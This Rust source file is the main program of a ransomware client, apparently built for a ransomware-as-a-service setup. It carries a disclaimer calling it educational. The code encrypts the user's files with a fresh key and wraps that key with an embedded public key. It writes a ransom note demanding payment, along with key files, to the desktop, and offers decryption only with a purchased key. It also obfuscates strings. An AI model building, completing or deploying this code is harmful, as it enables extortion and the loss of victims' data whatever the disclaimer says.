// I AM NOT RESPONSIBLE FOR ANYTHING YOU ARE DOING WITH THIS CODE
// This is a working example of the "client" that could be used for a RaaS (Ransomware as a Service)
// However, this was written just as an exercise and for educational purposes, do NOT use this for any illegal activity!

use std::env;
use std::fs;
use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};

use chacha20poly1305::aead::rand_core::RngCore;
use directories::UserDirs;
use konst::parsing::Parser;
use konst::result;
use rand::rngs::OsRng;
use uuid::Uuid;
use zeroize::Zeroize;

use client_lib::output::Output;
use client_lib::walker;

static PUB_KEY: &str = include_str!("../pub.key");
static HACKER_UUID: &str = env!("UUID");
static PRICE: u64 = result::unwrap!(Parser::parse_u64(&mut Parser::new(env!("PRICE"))));
static KEY_NAME: &str = "key.part1";
static INFO_NAME: &str = "key.part2";

fn main() {
    let args = env::args().collect::<Vec<String>>();
    if args.len() > 1 && args[1] == "decrypt" {
        let mut key = [0u8; 32];
        let mut file =
            File::open("decryption.key").expect("Cannot read keyfile (file must be named decryption.key)");
        file.read_exact(&mut key).expect("Cannot read key");
        walker::decrypt_everything(&key);
    } else {
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        walker::encrypt_everything(&key);

        let output = Output::new(
            obfstr::obfstr!("Crazy msg goes here").to_string(),
            PRICE,
            Uuid::new_v4().to_string(),
            HACKER_UUID.to_owned(),
        );
        let res = output.get_files(PUB_KEY, &key).unwrap();
        key.zeroize();
        drop(output);

        let ud = UserDirs::new();
        let msg_path = get_path("READ_ME.txt", &ud);
        let key_path = get_path(KEY_NAME, &ud);
        let info_path = get_path(INFO_NAME, &ud);

        fs::write(msg_path, format!("U gotta pay like {} USD", PRICE)).unwrap();
        fs::write(key_path, res.0).unwrap();
        fs::write(info_path, res.1).unwrap();
    }
}

fn get_path(filename: &str, ud: &Option<UserDirs>) -> PathBuf {
    match ud {
        None => Path::new(filename).to_path_buf(),
        Some(m) => {
            if let Some(m) = m.desktop_dir() {
                m.join(filename)
            } else {
                Path::new(filename).to_path_buf()
            }
        }
    }
}
